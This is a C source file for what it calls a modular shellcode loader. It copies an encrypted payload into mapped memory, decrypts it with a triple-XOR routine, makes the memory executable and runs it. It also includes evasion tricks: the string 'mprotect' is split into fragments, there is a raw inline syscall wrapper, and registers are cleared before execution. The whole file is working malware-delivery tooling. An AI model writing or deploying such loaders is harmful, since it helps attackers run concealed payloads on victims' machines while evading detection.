#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include "decrypt.h"
#include "executor.h"

static const char* s1 = "mem";
static const char* s2 = "prot";
static const char* s3 = "mpr";
static const char* s4 = "otect";

// Indirect system call wrapper
static long indirect_syscall(long number, long arg1, long arg2, long arg3) {
    register long result __asm__("rax");
    register long syscall_num __asm__("rax") = number;
    register long param1 __asm__("rdi") = arg1;
    register long param2 __asm__("rsi") = arg2;
    register long param3 __asm__("rdx") = arg3;
    
    __asm__ volatile (
        "syscall"
        : "=r"(result)
        : "r"(syscall_num), "r"(param1), "r"(param2), "r"(param3)
        : "rcx", "r11", "memory"
    );
    return result;
}

static char* assemble_string(const char* part1, const char* part2) {
    size_t len1 = 0, len2 = 0;
    
    while (part1[len1] != '\0') len1++;
    while (part2[len2] != '\0') len2++;
    
    char* result = malloc(len1 + len2 + 1);
    
    for (size_t i = 0; i < len1; i++) {
        result[i] = part1[i];
    }
    for (size_t i = 0; i < len2; i++) {
        result[len1 + i] = part2[i];
    }
    result[len1 + len2] = '\0';
    
    return result;
}

// Clear registers 
static void clear_registers(void) {
    __asm__ volatile (
        "xor %%rax, %%rax\n\t"
        "xor %%rbx, %%rbx\n\t"
        "xor %%rcx, %%rcx\n\t"
        "xor %%rdx, %%rdx\n\t"
        "xor %%rsi, %%rsi\n\t"
        "xor %%rdi, %%rdi\n\t"
        "xor %%r8, %%r8\n\t"
        "xor %%r9, %%r9\n\t"
        "xor %%r10, %%r10\n\t"
        "xor %%r11, %%r11\n\t"
        "xor %%r12, %%r12\n\t"
        "xor %%r13, %%r13\n\t"
        "xor %%r14, %%r14\n\t"
        "xor %%r15, %%r15"
        : : : "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
              "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"
    );
}

int main(int argc, char* argv[]) {
    printf("[*] Modular Shellcode Loader Initialized\n");
    printf("[*] Using triple XOR decryption pipeline\n");
    
    #include "../payload/payload.h"
    
    long page_size = sysconf(_SC_PAGESIZE);
    if (page_size == -1) {
        page_size = 4096; // Default fallback
    }
    
    size_t aligned_size = ((PAYLOAD_SIZE + page_size - 1) / page_size) * page_size;
    
    // Allocate memory using mmap
    void* exec_mem = mmap(NULL, aligned_size, PROT_READ | PROT_WRITE, 
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (exec_mem == MAP_FAILED) {
        perror("[-] mmap failed");
        return 1;
    }
    
    printf("[+] Allocated %zu bytes at: %p\n", aligned_size, exec_mem);
    
    unsigned char* mem_ptr = (unsigned char*)exec_mem;
    const unsigned char* payload_ptr = PAYLOAD;
    for (size_t i = 0; i < PAYLOAD_SIZE; i++) {
        mem_ptr[i] = payload_ptr[i];
    }
    
    printf("[*] Starting triple XOR decryption...\n");
    triple_xor_decrypt(mem_ptr, PAYLOAD_SIZE);
    printf("[+] Decryption completed\n");
    
    if (mprotect(exec_mem, aligned_size, PROT_READ | PROT_EXEC) == -1) {
        perror("[-] mprotect failed");
        munmap(exec_mem, aligned_size);
        return 1;
    }
    
    printf("[+] Memory marked as executable\n");
    
    clear_registers();
    
    printf("[*] Executing shellcode...\n");
    execute_shellcode(exec_mem);
    
    munmap(exec_mem, aligned_size);
    
    printf("[+] Execution completed\n");
    return 0;
}